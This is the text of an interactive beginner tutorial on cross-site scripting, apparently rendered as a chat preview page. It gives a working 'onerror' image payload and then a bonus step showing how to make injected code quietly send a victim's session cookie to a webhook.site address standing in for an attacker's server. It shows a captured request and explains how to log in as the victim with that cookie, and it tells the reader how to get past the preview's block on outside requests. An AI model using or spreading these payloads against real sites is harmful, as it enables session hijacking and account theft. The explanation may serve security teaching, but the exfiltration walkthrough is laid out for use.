Step 2 — your first real payload

Copy it. Paste it above. Watch what happens.

A payload is just the text you type to break things. This one looks like a broken picture — but when the picture fails to load, it secretly runs code instead.

<img src=x onerror=alert('XSS')>
This is a picture tag pointing at a file called "x", which does not exist. When it fails, the browser runs whatever is written after onerror=. No script tag needed.

The box below is a real, working mini page. It takes your text and places it the unsafe way, exactly like the broken code above. If a popup appears, that is not a trick — your browser just ran your code for real.

Step 3 (bonus) — how real hackers actually use this

Make your code quietly send data out

A popup only proves your code ran. A real attack does not show a popup at all — it quietly sends the victim's cookie to a server the attacker owns. We'll use webhook.site, a free site that gives you your own private web address and shows you everything anyone sends to it. It stands in for "the attacker's server" here.

1. Open webhook.site in a new tab — it gives you a free unique link right away, no sign up.

2. Copy that link and paste it in the box below.

3. Click "build payload" to see what it does, step by step, below.
No alert, no popup. The victim sees nothing change on the page.
What lands in your webhook.site inbox
GET /your-unique-id?cookie=session=8f3a1c...; role=admin
Host: webhook.site
Referer: this-page.html
That's the whole login cookie — the thing the site uses to know who you are. This demo page has no real cookie, so the example above is what a logged-in user's cookie typically looks like. With a real cookie, whoever receives it can paste it into their own browser and become that user, no password needed.

1. The victim opens the page — your code runs inside their browser, with their login.
2. Your code reads document.cookie — that's the victim's identity.
3. It quietly sends that cookie to your webhook link in the background.
4. You check your webhook.site tab — the victim's cookie is sitting there.

Heads up: inside this chat preview, outside requests are blocked as a safety rule, so nothing really leaves this tab here even after you click run. Opened as a local file on your own computer, clicking "run it for real" sends a genuine request — check your webhook.site tab for a new entry.
